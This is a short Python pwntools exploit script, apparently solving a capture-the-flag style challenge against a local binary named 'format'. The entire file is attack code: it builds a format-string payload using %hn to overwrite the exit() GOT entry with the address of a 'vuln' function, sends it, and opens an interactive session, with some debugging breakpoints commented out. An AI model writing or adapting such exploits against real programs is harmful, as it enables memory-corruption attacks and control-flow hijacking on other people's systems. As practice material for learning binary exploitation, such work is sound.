#!/usr/bin/python3
# Author: Shellc0de

from pwn import *
from pprint import pprint

# This function will encapsulate our payload into the given buffer

def padding(string):
    return string + b"X"*(512 - len(string))

def main():

    context(arch='i386', os='linux')
    elf = ELF("./format")
    binary = elf.process()

    # Debugging

#    gdb.attach(binary, '''
#    b*0x08049217 
#    b*0x08049224
#    c
#    c
#    c
#    x 0x804c01c
#    ''')


    print(elf)
    #pprint(elf.symbols)
    vulnAddr    = elf.symbols["vuln"]
    exitGOTAddr = elf.got["exit"]
    #print(exitGOTAddr)
    log.info(f"Exit GOT Addr {hex(exitGOTAddr)}")
    log.info(f"Vuln Addr {hex(vulnAddr)}")


    # Beginning of the paylaod
   
    #payload += "%x "*4
    payload = p32(exitGOTAddr) # This is where we want to alter
    payload += b"%4$37278x" # 0x0c8 - 0x91a2 -> 3200 + 34078
    payload += b"%4$hn"
    payload = padding(payload)

    binary.sendafter('\n',payload)
    binary.interactive()

if __name__ == '__main__':
    main()
